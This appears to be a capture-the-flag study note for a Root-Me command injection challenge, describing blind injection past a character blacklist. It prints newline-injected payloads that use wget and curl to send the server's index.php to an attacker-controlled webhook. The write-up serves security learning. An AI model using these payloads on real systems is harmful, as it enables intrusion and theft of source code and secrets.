### Ping2 - Advanced Filter Evasion and Out-of-Band Exfiltration

#### Navigating Blind Sinks and Fragile Blacklists

The curriculum now advances to a scenario that perfectly mirrors the complexities of modern security engagements, specifically focusing on the exercise hosted at [https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass](https://www.google.com/search?q=https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass). The target application presents a user interface that appears functionally identical to the initial warm-up exercise, utilizing a simple web form that submits an IP address via a POST request. However, the underlying implementation introduces two critical defensive mechanisms that you must overcome.

First, the application suppresses the actual standard output of the ping command, returning only a generic "Ping OK" for a valid format or a "Syntax Error" for an invalid one. This behavior transforms the vulnerability into a blind command injection, requiring you to carefully plan your payload to confirm execution and extract data through alternative means. Second, the developer has implemented an input filter utilizing a blacklist approach, which actively rejects the most obvious shell metacharacters such as semicolons, ampersands, pipes, single quotes, and dollar signs.

> Defending against command injection by enumerating bad characters in a blacklist is an inherently fragile strategy, as the application relies on the developer anticipating every possible byte that the underlying shell environment might interpret as a command separator, and missing exactly one character is sufficient to compromise the entire system.

#### Exploitation Workflow and Source Exfiltration

To successfully exploit this environment, you must adopt a systematic approach to bypass the restrictions and retrieve the flag, which is not stored in a standard text file but is instead hidden within the application's source code itself. Your exploitation workflow should proceed as follows:

1. **Separator Discovery:** Utilize an interception proxy like Burp Suite to systematically test various character encodings and less common shell separators against the input field, aiming to identify the single byte or sequence that the blacklist omitted but the shell still recognizes as a valid command boundary.
    
2. **Out-of-Band Channel Establishment:** Since you cannot see the command output in the HTTP response, you must establish an out-of-band exfiltration channel, configuring your injected payload to utilize a utility like `curl` or `wget` to transmit the desired data to an external listener you control, such as a webhook receiver service.
    
3. **Source Code Retrieval:** Craft your final payload to read the contents of the `index.php` file, pipe or append that content into your network command, and send it to your webhook, allowing you to analyze the source code offline to locate the hidden flag.
    

This combination of discovering a flawed filter, leveraging out-of-band exfiltration, and pivoting to read application source code is highly representative of real-world command injection engagements in modern web applications.

#### Constructing the Exfiltration Payload

Once we have achieved command separation, the next objective is to extract the target application's source code without relying on the suppressed standard output. To accomplish this, we construct a payload utilizing native network utilities like `curl` or `wget`, which are almost universally pre-installed on Linux web servers. We instruct the utility to read the target file and transmit its contents via an HTTP POST request to an external listener under our control.

Assuming you have generated a unique endpoint URL using a service like Webhook.site, the injected command would utilize the `--post-file` argument of `wget` or the `-d @` syntax of `curl` to encapsulate the local file within the body of the outbound network request.



```Bash
# Utilizing wget for out-of-band exfiltration
127.0.0.1%0a wget --post-file=index.php https://webhook.site/YOUR-UUID
```



```Bash
# Utilizing curl for out-of-band exfiltration
127.0.0.1%0a curl -X POST -d @index.php https://webhook.site/YOUR-UUID
```

#### Analyzing the Extracted Source

Upon submitting this crafted payload through the vulnerable input field, the server will execute the initial network ping, process the newline character, and subsequently execute our unauthorized network request. You will observe a new incoming HTTP POST request on your webhook listener dashboard, and the body of this request will contain the complete PHP source code of the application. By reviewing this exfiltrated code locally in your preferred markdown or text editor, you can analyze the hidden application logic, locate the exact variable or hardcoded string containing the flag, and successfully fulfill the objectives of the laboratory exercise.


![[Command Injection - Filter Bypass_2.png | 500]]

![[Command Injection - Filter Bypass_4.png | 500]]

![[Command Injection - Filter Bypass.png | 500]]

![[Command Injection - Filter Bypass_5.png | 500]]

![[Command Injection - Filter Bypass_1.png | 500]]

![[Command Injection - Filter Bypass_3.png | 500]]